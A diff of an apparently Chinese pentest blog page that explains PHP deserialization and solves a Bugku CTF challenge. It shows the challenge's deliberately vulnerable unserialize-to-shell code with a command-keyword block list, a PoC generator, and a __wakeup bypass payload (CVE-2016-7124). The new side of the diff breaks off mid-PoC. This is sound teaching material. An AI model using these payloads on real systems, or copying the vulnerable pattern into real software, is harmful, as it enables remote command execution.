@@ -1,221 +1,96 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>PHP 反序列化 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>PHP 反序列化</h1>
-      
-<div class="post-meta">
-    <time>2021-07-08</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>)
-</div>
-
-      <div><h3 id="0x01-php-中的魔法函数">0x01 php 中的魔法函数</h3>
-<p>__construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p>
-<p>__destruct()：PHP 中类的析构函数，销毁对象时调用。PHP 5 后引入了析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
-<p>__toString() 当一个对象被当作一个字符串使用。</p>
-<p>__sleep() 在对象在被序列化之前被调用。</p>
-<p>__wakeup 将在序列化之后立即被调用。</p>
-<h3 id="0x02-序列化和反序列化">0x02 序列化和反序列化</h3>
-<p>serialize() 会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会在 __construct 后被调用，然后才执行序列化操作。</p>
-<p>unserialize() 会检查类中是否存在一个 __wakeup() 方法。如果存在，则会在 __destruct 前调用 __wakeup 方法，预先准备对象需要的资源。</p>
-<h3 id="0x03-序列化字符串格式">0x03 序列化字符串格式</h3>
-<p>在 PHP 序列化得到的字符串中，字段根据长度判断内容、以 ; 作为字段的分隔、以 } 作为结尾(字符串除外)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;ctf&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;cmd&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;ls&#34;</span>;}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span> <span style="color:#a6e22e">代表对象，因为我们序列化的是一个对象，序列化数组则用</span> <span style="color:#a6e22e">A</span> <span style="color:#a6e22e">来表示</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#a6e22e">代表类名长度</span> 
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ctf</span> <span style="color:#a6e22e">是类名</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#a6e22e">代表两个属性</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">代表字符串</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span> <span style="color:#a6e22e">代表属性名长度</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">username</span> <span style="color:#a6e22e">是属性名</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#a6e22e">属性值时字符串</span> <span style="color:#a6e22e">属性值长度</span> <span style="color:#a6e22e">属性值</span>
-</span></span></code></pre></div><h3 id="0x04-序列化中的访问控制修饰符">0x04 序列化中的访问控制修饰符</h3>
-<p>需要<f>注意</f>的是当访问控制符为 private 与 protect 时，序列化时比较特殊：</p>
-<p>protected 属性被序列化的时候属性值会变成：%00*%00 属性名</p>
-<p>private 属性被序列化的时候属性值会变成：%00类名%00 属性名</p>
-<h3 id="0x05-题目">0x05 题目</h3>
-<p>Bugku CTF 的题 index.php</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Type: text/html;charset=utf-8&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;!-- YmFja3Vwcw== --&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ctf</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hack&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NULL&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $cmd) {
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $cmd;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __wakeup() {
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest&#39;</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/cat|more|tail|less|head|curl|sort|echo/i&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span>)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#39;</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;admin&#39;</span>) {
-</span></span><span style="display:flex;"><span>           <span style="color:#75715e">// echo &#34;&lt;br&gt;right!&lt;br&gt;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $a <span style="color:#f92672">=</span> <span style="color:#e6db74">`$this-&gt;cmd`</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">var_dump</span>($a);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$select <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;code&#39;</span>];
-</span></span><span style="display:flex;"><span>$res <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#f92672">@</span>$select);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><h3 id="0x06-构造-poc">0x06 构造 poc</h3>
-<p>题目中当 $this-&gt;username 为 admin 时才执行命令 `$this-&gt;cmd`</p>
-<p>所以我们需要设置 username 为 admin，同时给 cmd 设置值</p>
-<p>poc.php</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ctf</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $username;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $cmd;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $cmd)
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $cmd;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]<span style="color:#f92672">?</span>$_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]<span style="color:#f92672">:</span><span style="color:#e6db74">&#34;ls&#34;</span>;
-</span></span><span style="display:flex;"><span>$code <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctf</span>(<span style="color:#e6db74">&#39;admin&#39;</span>, $cmd));
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $code;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>输出：O:3:&ldquo;ctf&rdquo;:2:{s:11:&quot;*username&quot;;s:5:&ldquo;admin&rdquo;;s:6:&quot;*cmd&quot;;s:2:&ldquo;ls&rdquo;;}</p>
-<p>因为访问控制符为 private，所以 poc 需要改为：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ctf</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $username;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $cmd;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $cmd)
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $cmd;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]<span style="color:#f92672">?</span>$_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]<span style="color:#f92672">:</span><span style="color:#e6db74">&#34;ls&#34;</span>;
-</span></span><span style="display:flex;"><span>$code <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctf</span>(<span style="color:#e6db74">&#39;admin&#39;</span>, $cmd));
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;%00*%00&#34;</span>, $code);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>输出：O:3:&ldquo;ctf&rdquo;:2:{s:11:&quot;%00*%00username&quot;;s:5:&ldquo;admin&rdquo;;s:6:&quot;%00*%00cmd&quot;;s:2:&ldquo;ls&rdquo;;}</p>
-<p>当题目中的代码反序列化我们提交的 code 参数(序列化后的字符串，其实是类) 时，类会先调用构造函数 __construct，从而设置 username 为 admin、cmd 为 ls</p>
-<p>结束时我们的类调用析构函数 __destruct 时，$this-&gt;username === &lsquo;admin&rsquo; 就会为 true</p>
-<p>因为 unserialize() 在执行时会检查是否存在 __wakeup() 方法，题目中显然是存在的，所以执行完 __construct 后会再执行 __wakeup，那 $this-&gt;username 会再次被赋值为 &lsquo;guest&rsquo;，这里将变量个数修改为大于实际值的数就能够绕过(CVE-2016-7124)，所以最终 poc 为：
-<code>O:3:&quot;ctf&quot;:&lt;f&gt;5&lt;/f&gt;:{s:11:&quot;%00\*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00\*%00cmd&quot;;s:2:&quot;ls&quot;;}</code></p>
-<h3 id="0x07-利用">0x07 利用</h3>
-<p>每次本地访问 poc.php?cmd=whoami、poc.php?cmd=ls 生成对应的 poc</p>
-<p>然后访问 index.php?code=O:3:&ldquo;ctf&rdquo;:2:{xxxxxxxxxx} 即可</p>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>PHP 反序列化 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>PHP 反序列化</h1><div class=post-meta><time>2021-07-08</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>)</div><div><h3 id=0x01-php-中的魔法函数>0x01 php 中的魔法函数</h3><p>__construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><p>__destruct()：PHP 中类的析构函数，销毁对象时调用。PHP 5 后引入了析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p>__toString() 当一个对象被当作一个字符串使用。</p><p>__sleep() 在对象在被序列化之前被调用。</p><p>__wakeup 将在序列化之后立即被调用。</p><h3 id=0x02-序列化和反序列化>0x02 序列化和反序列化</h3><p>serialize() 会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会在 __construct 后被调用，然后才执行序列化操作。</p><p>unserialize() 会检查类中是否存在一个 __wakeup() 方法。如果存在，则会在 __destruct 前调用 __wakeup 方法，预先准备对象需要的资源。</p><h3 id=0x03-序列化字符串格式>0x03 序列化字符串格式</h3><p>在 PHP 序列化得到的字符串中，字段根据长度判断内容、以 ; 作为字段的分隔、以 } 作为结尾(字符串除外)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>O</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;ctf&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>{<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>11</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;username&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>5</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;admin&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>6</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;cmd&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>2</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;ls&#34;</span>;}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>O</span> <span style=color:#a6e22e>代表对象，因为我们序列化的是一个对象，序列化数组则用</span> <span style=color:#a6e22e>A</span> <span style=color:#a6e22e>来表示</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span> <span style=color:#a6e22e>代表类名长度</span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>ctf</span> <span style=color:#a6e22e>是类名</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> <span style=color:#a6e22e>代表两个属性</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>s</span> <span style=color:#a6e22e>代表字符串</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span> <span style=color:#a6e22e>代表属性名长度</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>username</span> <span style=color:#a6e22e>是属性名</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>5</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#a6e22e>属性值时字符串</span> <span style=color:#a6e22e>属性值长度</span> <span style=color:#a6e22e>属性值</span>
+</span></span></code></pre></div><h3 id=0x04-序列化中的访问控制修饰符>0x04 序列化中的访问控制修饰符</h3><p>需要<f>注意</f>的是当访问控制符为 private 与 protect 时，序列化时比较特殊：</p><p>protected 属性被序列化的时候属性值会变成：%00*%00 属性名</p><p>private 属性被序列化的时候属性值会变成：%00类名%00 属性名</p><h3 id=0x05-题目>0x05 题目</h3><p>Bugku CTF 的题 index.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-Type: text/html;charset=utf-8&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;!-- YmFja3Vwcw== --&gt;&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ctf</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;hack&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;NULL&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($username, $cmd) {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> $username;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cmd</span> <span style=color:#f92672>=</span> $cmd;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __wakeup() {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __destruct() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/cat|more|tail|less|head|curl|sort|echo/i&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cmd</span>)) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>exit</span>(<span style=color:#e6db74>&#39;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#39;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;admin&#39;</span>) {
+</span></span><span style=display:flex><span>           <span style=color:#75715e>// echo &#34;&lt;br&gt;right!&lt;br&gt;&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            $a <span style=color:#f92672>=</span> <span style=color:#e6db74>`$this-&gt;cmd`</span>;
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>var_dump</span>($a);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&#34;</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$select <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;code&#39;</span>];
+</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>(<span style=color:#f92672>@</span>$select);
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><h3 id=0x06-构造-poc>0x06 构造 poc</h3><p>题目中当 $this->username 为 admin 时才执行命令 `$this->cmd`</p><p>所以我们需要设置 username 为 admin，同时给 cmd 设置值</p><p>poc.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ctf</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $username;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $cmd;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($username, $cmd)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> $username;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cmd</span> <span style=color:#f92672>=</span> $cmd;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$cmd <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;cmd&#34;</span>]<span style=color:#f92672>?</span>$_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;ls&#34;</span>;
+</span></span><span style=display:flex><span>$code <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ctf</span>(<span style=color:#e6db74>&#39;admin&#39;</span>, $cmd));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $code;
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>输出：O:3:&ldquo;ctf&rdquo;:2:{s:11:"*username";s:5:&ldquo;admin&rdquo;;s:6:"*cmd";s:2:&ldquo;ls&rdquo;;}</p><p>因为访问控制符为 private，所以 poc 需要改为：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ctf</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $username;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $cmd;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($username, $cmd)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> $username;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cmd</span> <span style=color:#f92672>=</span> $cmd;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$cmd <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;cmd&#34;</span>]<span style=color:#f92672>?</span>$_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;ls&#34;</span>;
+</span></span><span style=display:flex><span>$code <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ctf</span>(<span style=color:#e6db74>&#39;admin&#39;</span>, $cmd));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;*&#34;</span>, <span style=color:#e6db74>&#34;%00*%00&#34;</span>, $code);
